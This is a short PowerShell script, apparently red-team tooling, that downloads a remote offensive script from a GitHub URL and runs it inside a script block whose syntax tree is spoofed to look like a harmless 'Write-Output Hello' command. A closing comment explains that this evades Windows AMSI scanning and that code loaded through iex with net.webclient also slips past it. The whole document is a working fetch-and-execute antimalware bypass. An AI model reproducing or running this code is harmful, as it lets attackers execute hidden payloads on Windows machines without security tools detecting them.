$c = (new-Object net.webclient).downloadstring('https://raw.githubusercontent.com/sn0wsec/red-team-trunk/refs/heads/main/Active_Directory/Bypasses/AMSI/windows_pwn.ps1')
$SpoofedAst = [ScriptBlock]::Create("Write-Output 'Hello'").Ast  
$ExecutedAst = [ScriptBlock]::Create("$c").Ast
$Ast = [System.Management.Automation.Language.ScriptBlockAst]::new($SpoofedAst.Extent,
                                                                   $null,
                                                                   $null,
                                                                   $null,
                                                                   $ExecutedAst.EndBlock.Copy(),
                                                                   $null)
$Sb = $Ast.GetScriptBlock()
# Any function - such as in this case WinPwn - that you want to be executed must be already called in the Scriptblock on the remote webserver. Fun fact, scripts that are loaded by the Script itself via iex(new-object net.webclient) also bypass AMSI.
& $Sb
